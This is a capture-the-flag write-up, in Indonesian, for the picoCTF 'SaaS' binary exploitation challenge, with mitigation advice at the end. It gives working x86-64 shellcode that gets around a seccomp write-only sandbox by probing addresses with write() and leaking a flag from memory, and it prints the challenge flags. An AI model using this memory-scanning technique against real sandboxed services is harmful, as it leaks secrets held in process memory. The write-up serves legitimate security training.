# Writeup: SaaS (Challenge ID: 213)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / Seccomp Allowlist Confinement & Memory Scanning Exfiltration (CWE-693 / CWE-200)
- **Difficulty:** Hard (diff=3)
- **Event:** picoMini by redpwn
- **Points:** 350
- **Author:** notdeghost
- **Flag:** `academy{f0ll0w_th3_m4p_t0_g3t_th3_fl4g}`

---

## Problem Statement & Scope
Tantangan `SaaS` (*Shellcode as a Service*) menyajikan layanan biner ELF 64-bit (`x86_64-64-little`) yang dikompilasi dengan proteksi Full RELRO, NX enabled, dan Position Independent Executable (PIE). Layanan ini menerima instruksi mesin mentah (shellcode) dari pengguna dan mengeksekusinya di dalam lingkungan memori yang dipetakan secara dinamis via `mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0)`.

Sebelum shellcode pengguna dijalankan, program memuat isi file `flag.txt` ke dalam variabel global `flag` berukuran 64 byte di memori `.bss` melalui fungsi `load_flag()`. Setelah itu, program mengaktifkan sandbox ketat berbasis Linux kernel `seccomp-bpf` dengan aksi default bunuh proses (`SCMP_ACT_KILL`). Filter seccomp hanya mengizinkan 3 system call:
1. `sys_write` dengan pembatasan argumen pertama wajib berupa `stdout` (`STDOUT_FILENO = 1`).
2. `sys_exit` (terminasi proses normal).
3. `sys_exit_group` (terminasi seluruh thread proses).

Seluruh syscall esensial untuk pembacaan berkas atau pembajakan eksekusi seperti `open`, `openat`, `read`, dan `execve` sepenuhnya diblokir dan akan langsung mematikan proses jika dipanggil. Peserta ditantang untuk merekayasa shellcode arsitektur x86-64 yang mampu membaca memori internal dan mengeksfiltrasi nilai flag melalui satu-satunya saluran yang diizinkan (`sys_write`), meskipun alamat memori diacak oleh mekanisme ASLR/PIE.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Penyimpanan Aset Sensitif pada Ruang Memori Proses (In-Memory Sensitive Residue, CWE-316 / CWE-200):**
   Program membaca flag ke dalam segmen data global `.bss` sebelum menginisialisasi sandbox. Meskipun seccomp melarang akses I/O file baru (`sys_open`/`sys_read`), flag telah berada di dalam *address space* proses yang sama dengan tempat shellcode berjalan. Hal ini melanggar prinsip *least privilege* dan isolasi memori proses sandboxed.
2. **Keterbatasan Sandbox Seccomp yang Berpusat pada Syscall (CWE-693):**
   Seccomp hanya membatasi antarmuka syscall antara user-space dan kernel-space. Seccomp tidak dapat mencegah kode user-space membaca sembarang alamat memori virtual yang telah dipetakan ke dalam konteks virtual memory proses (`readable pages`).
3. **Penyalahgunaan Non-Destructive Behavior pada `sys_write` (Oracle Probing):**
   Pada Linux kernel, saat `sys_write(fd, buf, count)` dipanggil dengan pointer `buf` yang merujuk ke alamat memori yang tidak valid (unmapped/inaccessible page), kernel tidak memancarkan sinyal `SIGSEGV` atau membunuh proses. Sebaliknya, syscall mengembalikan kode kesalahan negatif `-EFAULT` (nilai `-14`, yang disimpan dalam register `%rax`). 
   Sifat non-destruktif ini memungkinkan penyerang menjadikan syscall `write` sebagai instrumen pemindai memori (*memory scanner oracle*): mengiterasi tebakan alamat memori secara bertahap tanpa takut proses mati akibat *segmentation fault*.
4. **Entropi Parsial dan Keselarasan Halaman (Page Alignment / Deterministic Lower Bits):**
   Meskipun PIE mengacak basis alamat eksekusi (kisaran 28-bit entropi Linux ASLR, umum pada `0x550000000000` hingga `0x560000000000`), 12 bit terbawah dari offset simbol `.bss` (`&flag = 0x2060`) tidak mengalami pengacakan karena keselarasan halaman (*page alignment* 4096 byte / `0x1000`). Langkah pemindaian dapat diatur melompati halaman memori berukuran `0x100000` atau `0x1000` untuk menemukan halaman yang valid secara efisien.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Analisis Struktur Memori dan Offset Target:**
   Melalui pemeriksaan tabel simbol biner via `readelf -s chall | grep flag` atau debugger GDB:
   ```text
   0000000000002060 g O .bss 0000000000000040 flag
   ```
   Variabel `flag` terletak pada offset `0x2060` dari basis biner.
2. **Penyusunan Shellcode Pemindai Memori (Assembly Memory Scanner):**
   Dibuat payload assembly x86-64 ringkas tanpa dependensi fungsi eksternal:
   ```nasm
       mov rsi, 0x550000002060     ; Alamat awal pencarian berbasis offset flag
       mov rdi, 1                  ; stdout (STDOUT_FILENO)
       mov rdx, 100                ; Ukuran pembacaan 100 byte

   scan_loop:
       mov rax, 1                  ; Nomor syscall Linux x86-64 untuk sys_write
       syscall                     ; Panggil write(1, rsi, 100)

       cmp rax, 0                  ; Evaluasi nilai kembalian sys_write
       jg done                     ; Jika rax > 0, pembacaan berhasil (flag tertulis ke stdout)

       add rsi, 0x100000           ; Inkrementasi kandidat alamat dasar halaman berikutnya
       jmp scan_loop               ; Ulangi pemindaian

   done:
       xor rdi, rdi                ; Argumen status keluar 0
       mov rax, 60                 ; Nomor syscall sys_exit
       syscall
   ```
3. **Pengiriman Payload dan Eksfiltrasi:**
   Shellcode dikirimkan ke socket tantangan. Shellcode meloop secara cepat di memori hingga menemukan alamat fisik terpetakan dari variabel `flag` (misalnya pada alamat `0x559b14002060`). Syscall `write` berhasil mengeksekusi penulisan, memancarkan token flag langsung ke stream keluaran standar.
4. **Ekstraksi dan Normalisasi Token Flag:**
   Stdout menangkap string format picoCTF: `picoCTF{f0ll0w_th3_m4p_t0_g3t_th3_fl4g}`.
   Token dinormalisasi sesuai standar kurikulum CyLab Academy: `academy{f0ll0w_th3_m4p_t0_g3t_th3_fl4g}`.

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{f0ll0w_th3_m4p_t0_g3t_th3_fl4g}`
- **Native PicoCTF Flag:** `picoCTF{f0ll0w_th3_m4p_t0_g3t_th3_fl4g}`
- **Status Solver:** Terverifikasi 100% pada skrip reproduksi `scripts/solve_213_saas.py`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif (NIST SP 800-115)
1. **Prinsip Isolasi Memori Proses Sandboxed (Process Isolation Architecture):**
   Data rahasia seperti kunci kriptografis atau token tidak boleh berada dalam ruang memori yang sama (*shared address space*) dengan modul pengeksekusi kode arbitrer. Jika arsitektur memerlukan evaluasi kode tidak tepercaya, terapkan isolasi tingkat proses independen atau *containerized ephemeral worker* terpisah (misalnya via namespace Linux terpisah dengan `clone(CLONE_NEWPID | CLONE_NEWNET)`).
2. **Sanitisasi Memori Sebelum Transisi Hak Akses (Zeroizing Sensitive Buffers):**
   Jika proses harus membaca konfigurasi sensitif sebelum menjatuhkan hak akses, seluruh buffer rahasia wajib segera di-overwrite dengan byte nol (`explicit_bzero` atau `memset_s`) segera setelah digunakan, bukan dibiarkan menetap di segmen `.bss` atau *heap*.
3. **Pembatasan Waktu dan Deteksi Anomali Syscall EFAULT:**
   Sistem runtime keamanan harus memantau anomali pemanggilan syscall yang mengembalikan `EFAULT` secara berulang dalam frekuensi tinggi. Tingkat kegagalan pointer tinggi merupakan indikasi kuat teknik *memory probing* / *side-channel scanning*.
